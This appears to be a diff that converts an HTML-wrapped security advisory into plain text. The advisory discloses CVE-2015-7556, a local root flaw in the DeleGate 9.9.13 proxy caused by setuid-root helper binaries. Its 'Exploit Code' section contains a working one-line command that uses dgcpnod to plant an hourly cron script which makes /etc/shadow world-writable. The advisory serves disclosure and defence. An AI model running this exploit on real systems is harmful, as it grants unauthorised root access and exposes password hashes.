@@ -1,45 +1,46 @@
-<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
-"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
-<html xmlns="http://www.w3.org/1999/xhtml">
-<head>
-<title></title>
-<meta name="generator" content="HTML::TextToHTML v2.51"/>
-</head>
-<body>
-<p>&lt;html&gt;&lt;title&gt;Vulnerability&lt;/title&gt;&lt;head&gt; &lt;style type="text/css"&gt;&lt;!-- A {text-decoration:none} --&gt;div {
-</p><p>    white-space: pre-wrap;      /* CSS3 <em>/
-    white-space: -moz-pre-wrap; /</em> Firefox <em>/
-    white-space: -pre-wrap;     /</em> Opera &lt;7 <em>/
-    white-space: -o-pre-wrap;   /</em> Opera 7 */
-    word-wrap: break-word;<br/>
-}&lt;/style&gt;&lt;/head&gt;&lt;body alink="<strong>EE0000" link="</strong>0000EE" bgcolor="#333333" text="#000000" vlink="#551A8B"&gt;&lt;center&gt;&lt;table border="0" cellpadding="2" cellspacing="2" width="70%"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td style="background-color:rgb(150,200,200);font-weight: bold;"&gt;&lt;center&gt;Advisory #: 159&lt;/center&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Title:&lt;/b&gt; Local root vulnerability in DeleGate v9.9.13&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Author: &lt;/b&gt;Larry W. Cashdollar, @_larry0&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Date:&lt;/b&gt; 2015-12-17&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Download Site:&lt;/b&gt; &lt;a href="<a href="http://www.delegate.org/delegate/download/">http://www.delegate.org/delegate/download/</a>"&gt;<a href="http://www.delegate.org/delegate/download/&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td">http://www.delegate.org/delegate/download/&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td</a> style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Vendor: &lt;/b&gt;National Institute of Advanced Industrial Science and Technology&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Vendor Notified: &lt;/b&gt; 2015-12-17&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Vendor Contact:&lt;/b&gt;  <a href="mailto:y.sato@delegate.org">y.sato@delegate.org</a> <a href="mailto:ysato@etl.go.jp">ysato@etl.go.jp</a>&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Description:&lt;/b&gt; &lt;span style="color: rgb(0, 0, 0); font-family: Times; font-size: medium; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: normal; orphans: auto; text-align: start; text-indent: 0px; text-transform: none; white-space: pre-wrap; widows: auto; word-spacing: 0px; -webkit-text-stroke-width: 0px; display: inline !important; float: none;"&gt;DeleGate is a multipurpose proxy server which relays various application protocols on TCP/IP or UDP/IP, including HTTP, FTP, Telnet, NNTP, SMTP, POP, IMAP, LPR, LDAP, ICP, DNS, SSL, Socks, and more. DeleGate mediates communication between servers and clients where direct communication is impossible, inefficient, or inconvenient.&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Vulnerability:&lt;/b&gt;&lt;div&gt;Installation of delegate 9.9.13 sets some binaries setuid root, at least one of these binaries can be used to gain root access.  The binary dgcpnod creates a node allowing a local unprivileged user to create files anywhere on disk.   By creating a file in /etc/cron.hourly a local user can execute commands as root.
-</p><p>Installation of software via source or binary distribution with option to not run as root results in a script set-subin.sh to run setting the setuid bit on four binaries.  In Linux distributions where this software is part of the package list these binaries are not setuid root. (archlinux) 
-</p><p>From documentation <a href="http://www.delegate.org/delegate/newbies-ja.shtml">http://www.delegate.org/delegate/newbies-ja.shtml</a>:
-Go is included in the binary distribution, or DGROOT that you can build from the source to the location of preference, and then change the name if necessary. This is the DgRoot. In addition, if needed, you can rename the executable file of DeleGate to the name of the preference. This is the DgExe.
-&amp;quot;In Unix version subin in if you want to use &amp;quot;(such as when using a privileged port), do the following.
- 
-</p><p>  (3-2uk) $ cd DgRoot / subin 
-</p><p>          $ Sh setup-subin.sh 
-</p><p>larry@f4ult:~/dg9_9_13/DGROOT/subin$ ls -l
-total 1916<br/>
--r-sr-s--- 1 root  larry 384114 Oct 31  2014 dgbind
--r-sr-s--- 1 root  larry 384598 Oct 31  2014 dgchroot
--r-sr-s--- 1 root  larry 384161 Oct 31  2014 dgcpnod
--rwxr-xr-x 1 larry larry 384114 Oct 31  2014 dgdate
--rwxr-xr-x 1 larry larry  29066 Oct 31  2014 dgforkpty
--r-sr-s--- 1 root  larry 384113 Oct 31  2014 dgpam
--rwxr-x--- 1 larry larry    272 Oct 27  2014 setup-subin.sh
-</p><p>This script sets the setuid bit:
-</p><p>larry@f4ult:~/dg9_9_13/DGROOT/subin$ cat setup-subin.sh
-#!/bin/sh
-</p><p>SUBINS=&amp;quot;dgpam dgbind dgchroot dgcpnod&amp;quot;
-sudo sh -c &amp;quot;chown root $SUBINS; chmod 6550 $SUBINS&amp;quot;
-if [ $? != 0 ]; then<br/>
-  su root -c &amp;quot;chown root $SUBINS; chmod 6550 $SUBINS&amp;quot;
-fi<br/>
-&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;CVE-2015-7556&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;JSON:&lt;/b&gt;&lt;a href="json.php?s=159"&gt; Export&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Exploit Code:&lt;/b&gt;&lt;div&gt;&lt;pre class="php" style="font-family:monospace;"&gt;&lt;ol&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;$ &lt;a href="<a href="http://www.php.net/touch">http://www.php.net/touch</a>"&gt;&lt;span style="color: #990000;"&gt;touch&lt;/span&gt;&lt;/a&gt; &lt;span style="color: #339933;"&gt;/&lt;/span&gt;tmp&lt;span style="color: #339933;"&gt;/&lt;/span&gt;rootme&lt;span style="color: #339933;"&gt;;&lt;/span&gt; &lt;a href="<a href="http://www.php.net/chmod">http://www.php.net/chmod</a>"&gt;&lt;span style="color: #990000;"&gt;chmod&lt;/span&gt;&lt;/a&gt; &lt;span style="color: #339933;"&gt;+&lt;/span&gt;x &lt;span style="color: #339933;"&gt;/&lt;/span&gt;tmp&lt;span style="color: #339933;"&gt;/&lt;/span&gt;rootme&lt;span style="color: #339933;"&gt;;&lt;/span&gt; &lt;span style="color: #339933;"&gt;./&lt;/span&gt;dgcpnod &lt;span style="color: #339933;"&gt;/&lt;/span&gt;tmp&lt;span style="color: #339933;"&gt;/&lt;/span&gt;rootme &lt;span style="color: #339933;"&gt;/&lt;/span&gt;etc&lt;span style="color: #339933;"&gt;/&lt;/span&gt;cron&lt;span style="color: #339933;"&gt;.&lt;/span&gt;hourly&lt;span style="color: #339933;"&gt;/&lt;/span&gt;rootme&lt;span style="color: #339933;"&gt;;&lt;/span&gt; &lt;span style="color: #b1b100;"&gt;echo&lt;/span&gt; &lt;span style="color: #339933;"&gt;-&lt;/span&gt;e &lt;span style="color: #0000ff;"&gt;'#!/bin/bash \n chmod 777 /etc/shadow'&lt;/span&gt; &lt;span style="color: #339933;"&gt;&amp;gt;&lt;/span&gt; &lt;span style="color: #339933;"&gt;/&lt;/span&gt;etc&lt;span style="color: #339933;"&gt;/&lt;/span&gt;cron&lt;span style="color: #339933;"&gt;.&lt;/span&gt;hourly&lt;span style="color: #339933;"&gt;/&lt;/span&gt;rootme &lt;/div&gt;&lt;/li&gt;&lt;/ol&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Screen Shots:&lt;/b&gt; &lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Advisory:&lt;/b&gt; &lt;a href="<a href="http://www.vapidlabs.com/advisory.php?v=159">http://www.vapidlabs.com/advisory.php?v=159</a>"&gt;<a href="http://www.vapidlabs.com/advisory.php?v=159&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/center&gt;&lt;/body&gt">http://www.vapidlabs.com/advisory.php?v=159&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/center&gt;&lt;/body&gt</a>;
-&lt;/html&gt;
-</p>
-
-</body>
-</html>
+                                Advisory #: 159
+Title: Local root vulnerability in DeleGate v9.9.13
+Author:Larry W. Cashdollar, @_larry0
+Date: 2015-12-17
+Download Site: http://www.delegate.org/delegate/download/
+Vendor:National Institute of Advanced Industrial Science and Technology
+Vendor Notified: 2015-12-17
+Vendor Contact: y.sato@delegate.org ysato@etl.go.jp
+Description: DeleGate is a multipurpose proxy server which relays various
+application protocols on TCP/IP or UDP/IP, including HTTP, FTP, Telnet, NNTP,
+SMTP, POP, IMAP, LPR, LDAP, ICP, DNS, SSL, Socks, and more. DeleGate mediates
+communication between servers and clients where direct communication is
+impossible, inefficient, or inconvenient.
+Vulnerability:
+Installation of delegate 9.9.13 sets some binaries setuid root, at least one of
+these binaries can be used to gain root access. The binary dgcpnod creates a
+node allowing a local unprivileged user to create files anywhere on disk. By
+creating a file in /etc/cron.hourly a local user can execute commands as root.
+Installation of software via source or binary distribution with option to not
+run as root results in a script set-subin.sh to run setting the setuid bit on
+four binaries. In Linux distributions where this software is part of the
+package list these binaries are not setuid root. (archlinux) From documentation
+http://www.delegate.org/delegate/newbies-ja.shtml: Go is included in the binary
+distribution, or DGROOT that you can build from the source to the location of
+preference, and then change the name if necessary. This is the DgRoot. In
+addition, if needed, you can rename the executable file of DeleGate to the name
+of the preference. This is the DgExe. "In Unix version subin in if you want to
+use "(such as when using a privileged port), do the following. (3-2uk) $ cd
+DgRoot / subin $ Sh setup-subin.sh larry@f4ult:~/dg9_9_13/DGROOT/subin$ ls -
+l total 1916 -r-sr-s--- 1 root larry 384114 Oct 31 2014 dgbind -r-sr-s--- 1
+root larry 384598 Oct 31 2014 dgchroot -r-sr-s--- 1 root larry 384161 Oct 31
+2014 dgcpnod -rwxr-xr-x 1 larry larry 384114 Oct 31 2014 dgdate -rwxr-xr-x 1
+larry larry 29066 Oct 31 2014 dgforkpty -r-sr-s--- 1 root larry 384113 Oct 31
+2014 dgpam -rwxr-x--- 1 larry larry 272 Oct 27 2014 setup-subin.sh This script
+sets the setuid bit: larry@f4ult:~/dg9_9_13/DGROOT/subin$ cat setup-subin.sh
+#!/bin/sh SUBINS="dgpam dgbind dgchroot dgcpnod" sudo sh -c "chown root
+$SUBINS; chmod 6550 $SUBINS" if [ $? != 0 ]; then su root -c "chown root
+$SUBINS; chmod 6550 $SUBINS" fi
+CVE-2015-7556
+JSON:Export
+Exploit Code:
+   1. $ touch /tmp/rootme; chmod +x /tmp/rootme; ./dgcpnod /tmp/rootme /etc/
+      cron.hourly/rootme; echo -e '#!/bin/bash \n chmod 777 /etc/shadow' > /
+      etc/cron.hourly/rootme
+Screen Shots:
+Advisory: http://www.vapidlabs.com/advisory.php?v=159
